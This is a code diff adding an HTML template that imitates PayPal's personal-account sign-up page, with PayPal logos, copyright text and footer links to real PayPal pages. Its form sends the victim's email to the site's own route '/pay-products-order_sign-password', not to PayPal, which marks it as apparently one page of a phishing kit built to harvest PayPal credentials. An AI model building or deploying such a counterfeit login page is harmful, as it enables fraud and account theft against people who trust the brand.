@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign up for Personal account</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='paypal.css') }}">
+    <script src="https://kit.fontawesome.com/a8c88432fd.js" crossorigin="anonymous"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="https://www.paypal.com/" class="container-logo">
+                <img src="../static/paypal-color.svg" class="logo-paypal">
+            </a>
+        </nav>
+    </header>
+    <article>
+        <div class="box">
+            <img src="../static/pp_fc_mg.svg" class="logo-mini-paypal">
+            <div class="component-title">
+                <p>Sign up for a Personal account</p>
+            </div>
+            <div class="component-description">
+                <p>Enter the email address you’ll use to sign up or log in</p>
+            </div>
+            <form action="/pay-products-order_sign-password" method="post" class="container-personal">
+                <input type="email" id="email" name="email" class="input-personal" placeholder="Email address">
+                <div class="component-button">
+                    <a href="/pay-products-order_sign-password">
+                        <button type="submit" class="button-continue">Continue</button>
+                    </a>
+                </div>
+            </form>
+        </div>
+    </article>
+    <footer>
+        <div class="set-copyright">
+            <p>Copyright © 1999 - 2024 PayPal. All rights reserved.</p>
+        </div>
+        <div class="set-info">
+            <a href="https://www.paypal.com/us/webapps/mpp/ua/privacy-full?locale.x=en_US">Privacy Statement</a>
+            <p>&#160|&#160</p>
+            <a href="https://www.paypal.com/us/webapps/mpp/ua/legalhub-full?locale.x=en_US">Legal agreements</a>
+            <p>&#160|&#160</p>
+            <a href="https://www.paypal.com/us/webapps/helpcenter/helphub/home?locale.x=en_US">Help</a>
+            <p>&#160|&#160</p>
+            <a href="https://www.paypal.com/us/smarthelp/contact-us?locale.x=en_US">Contact Us</a> 
+        </div>
+    </footer>
+</body>
+</html>
